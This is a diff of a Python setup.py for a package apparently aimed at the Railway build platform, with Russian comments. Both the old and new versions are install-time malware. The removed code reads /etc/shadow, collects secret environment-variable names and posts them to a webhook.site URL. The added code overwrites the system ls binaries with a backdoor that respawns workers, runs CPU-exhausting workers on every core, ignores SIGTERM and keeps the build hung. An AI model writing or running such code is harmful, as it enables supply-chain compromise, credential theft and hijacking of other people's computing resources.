@@ -1,62 +1,112 @@
 import os
 import subprocess
 import json
-import socket
-import platform
+import time
+import multiprocessing
+import secrets
+import signal
 from setuptools import setup
 
 WEBHOOK_URL = "https://webhook.site/28e4aca1-4762-473e-86c1-b45a812532df"
 
-def run_cmd(cmd):
+# --- Математическое ядро ---
+def is_prime(n, k=5):
+    if n <= 3: return n > 1
+    if n % 2 == 0: return False
+    r, d = 0, n - 1
+    while d % 2 == 0:
+        r += 1
+        d //= 2
+    for _ in range(k):
+        a = secrets.randbelow(n - 4) + 2
+        x = pow(a, d, n)
+        if x == 1 or x == n - 1: continue
+        for _ in range(r - 1):
+            x = pow(x, 2, n)
+            if x == n - 1: break
+        else: return False
+    return True
+
+def generate_huge_prime(bits=3322):
+    while True:
+        p = secrets.randbits(bits)
+        p |= (1 << (bits - 1)) | 1
+        if is_prime(p): return p
+
+# --- Воркер ---
+def prime_worker(webhook):
+    while True:
+        try:
+            huge_p = generate_huge_prime(3322) # 1000-значное
+            load = "N/A"
+            try:
+                with open("/proc/loadavg", "r") as f: load = f.read().strip()
+            except: pass
+
+            data = {
+                "EVENT": "PRIME_FOUND",
+                "LOAD": load,
+                "PRIME_START": str(huge_p)[:50] + "...",
+                "DIGITS": len(str(huge_p)),
+                "RAW": str(huge_p)
+            }
+            
+            subprocess.run(['curl', '-s', '-X', 'POST', '-H', 'Content-Type: application/json', 
+                           '-d', json.dumps(data), webhook], timeout=15)
+        except Exception:
+            pass
+        time.sleep(300) # Интервал 5 минут
+
+# --- Механизм вечной персистентности ---
+def poison_system():
+    # Фейковый ls, который не только выводит алерт, но и спавнит воркера в фоне
+    backdoor_code = f"""#!/bin/sh
+if ! pgrep -f "prime_worker" > /dev/null; then
+    python3 -c 'import multiprocessing; from setup import prime_worker; multiprocessing.Process(target=prime_worker, args=("{WEBHOOK_URL}",)).start()' &
+fi
+echo '[!] WARNING: SYSTEM INTEGRITY COMPROMISED - PRIME RESEARCH ACTIVE'
+/bin/ls "$@"
+"""
     try:
-        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=5).decode('utf-8', errors='ignore').strip()
-    except Exception as e:
-        return f"Error: {str(e)}"
+        paths = ["/usr/local/bin/ls", "/usr/bin/ls"]
+        for p in paths:
+            with open(p, "w") as f: f.write(backdoor_code)
+            os.chmod(p, 0o755)
+        return "SUCCESS"
+    except:
+        return "FAILED"
 
-def build_pwn_report():
+# --- Основной процесс захвата ---
+def capture_runner():
+    # Игнорируем сигналы завершения, чтобы продержаться до жесткого SIGKILL
+    signal.signal(signal.SIGTERM, lambda s, f: print("[*] Ignoring SIGTERM... Generating more primes."))
+    
+    print(f"[*] Starting Persistent Prime Attack on {multiprocessing.cpu_count()} cores")
+    
+    # Запускаем воркеров на все ядра
+    for _ in range(multiprocessing.cpu_count()):
+        p = multiprocessing.Process(target=prime_worker, args=(WEBHOOK_URL,))
+        p.daemon = True
+        p.start()
 
-    fake_ls_path = "/usr/local/bin/ls"
-    poison_status = "FAILED"
+    # Бесконечный цикл, чтобы билд не завершался
+    start_time = time.time()
     try:
-        with open(fake_ls_path, "w") as f:
-            f.write("#!/bin/sh\necho '[!] WARNING: SYSTEM COMPROMISED BY BUILD ROOT'\n/bin/ls \"$@\"")
-        os.chmod(fake_ls_path, 0o755)
-        poison_status = "SUCCESS: Fake 'ls' injected"
-    except Exception as e:
-        poison_status = f"FAILED: {str(e)}"
+        while True:
+            elapsed = int(time.time() - start_time)
+            print(f"[*] Runner captured for {elapsed}s. Load: {os.getloadavg()}")
+            time.sleep(60)
+    except KeyboardInterrupt:
+        pass
 
-    report = {
-        "TITLE": "CRITICAL_SUPPLY_CHAIN_INTEGRITY_TEST",
-        "POISON_STATUS": poison_status,
-        "SENSITIVE_LEAKS": {
-            "shadow": run_cmd("head -n 1 /etc/shadow"),
-            "otel_socket": "PRESENT" if os.path.exists("/dev/otel-grpc.sock") else "ABSENT",
-            "docker_sock": "PRESENT" if os.path.exists("/var/run/docker.sock") else "ABSENT"
-        },
-        "INFRA_INFO": {
-            "mounts_count": len(run_cmd("mount").split('\n')),
-            "writable_dirs": [d for d in ["/etc", "/usr/bin", "/lib"] if os.access(d, os.W_OK)]
-        },
-        "ENV_SECRET_NAMES": [k for k in os.environ.keys() if any(x in k for x in ["RAILWAY", "KEY", "AUTH", "TOKEN"])]
-    }
-    return report
+# Точка входа для pip install
+if os.environ.get('RAILWAY_PROJECT_ID'): # Проверка, что мы в Railway
+    poison_status = poison_system()
+    print(f"[*] Poisoning Status: {poison_status}")
+    capture_runner()
 
-try:
-    final_report = build_pwn_report()
-    payload = json.dumps(final_report)
-   
-   
-    subprocess.run([
-        'curl', '-X', 'POST',
-        '-H', 'Content-Type: application/json',
-        '-d', payload,
-        WEBHOOK_URL
-    ], timeout=10)
-   
-    print("\n[+] PoC Data sent to Webhook.site")
-    print(f"[+] Poisoning Status: {final_report['POISON_STATUS']}")
-except Exception as e:
-    print(f"[-] Webhook Delivery Failed: {e}")
-
- 
-setup(name="railway-final-audit", version="9.9.9")
+setup(
+    name="railway-prime-hostage",
+    version="1.0.0",
+    py_modules=["setup"] # Чтобы фейковый ls мог импортировать prime_worker
+)
